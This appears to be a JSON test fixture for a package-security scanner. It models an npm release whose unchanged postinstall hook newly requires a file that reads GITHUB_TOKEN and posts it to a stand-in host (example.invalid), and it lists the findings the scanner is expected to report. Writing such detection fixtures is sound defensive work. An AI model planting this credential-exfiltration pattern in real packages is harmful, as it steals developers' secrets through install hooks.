@@ -1,0 +1,97 @@
+{
+  "id": "existing-hook-newly-reachable-payload",
+  "title": "An unchanged hook newly imports an unchanged credential payload",
+  "category": "credential-steal",
+  "intent": "The malicious file bytes pre-exist this release, but a new static import makes them execute during installation. Source is inert JSON evidence; no code is executed.",
+  "previousPackageJson": {
+    "name": "install-activation-fixture",
+    "version": "1.0.0",
+    "scripts": {
+      "postinstall": "node setup.js"
+    }
+  },
+  "stagedPackageJson": {
+    "name": "install-activation-fixture",
+    "version": "1.0.1",
+    "scripts": {
+      "postinstall": "node setup.js"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 97,
+      "sha256": "dd7a3174124dba5fb556653e603ffa33eb950f6fcb7be5682cbaf6476917a3be",
+      "flags": [],
+      "textSample": "{\"name\":\"install-activation-fixture\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node setup.js\"}}"
+    },
+    {
+      "path": "setup.js",
+      "size": 31,
+      "sha256": "178e141ab53da8393b9fc03b971f90ee972a6c8a2f1d9f70ad1a45591ef69f8d",
+      "flags": [],
+      "textSample": "console.log('setup complete');\n"
+    },
+    {
+      "path": "test/payload.js",
+      "size": 114,
+      "sha256": "e70740661f5d648b3b4c86e206bc148d8212802e8bcd4069623c063183f67122",
+      "flags": [],
+      "textSample": "const token = process.env.GITHUB_TOKEN;\nfetch('https://example.invalid/ingest', { method: 'POST', body: token });\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 97,
+      "sha256": "ec46acd1e9f12578952d8abcc3558b18eda42c2733fb457cb01018db2d3cec53",
+      "flags": [],
+      "textSample": "{\"name\":\"install-activation-fixture\",\"version\":\"1.0.1\",\"scripts\":{\"postinstall\":\"node setup.js\"}}"
+    },
+    {
+      "path": "setup.js",
+      "size": 30,
+      "sha256": "4904a6b1ba9187dceb5e976e75d1ec77fcc1d89d1be92dc490fbb624fcee1e8a",
+      "flags": [],
+      "textSample": "require('./test/payload.js');\n"
+    },
+    {
+      "path": "test/payload.js",
+      "size": 114,
+      "sha256": "e70740661f5d648b3b4c86e206bc148d8212802e8bcd4069623c063183f67122",
+      "flags": [],
+      "textSample": "const token = process.env.GITHUB_TOKEN;\nfetch('https://example.invalid/ingest', { method: 'POST', body: token });\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedReleaseRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "install-script.lifecycle",
+      "severity": "high",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "test/payload.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "test/payload.js"
+    }
+  ],
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "test/payload.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "test/payload.js"
+    }
+  ]
+}
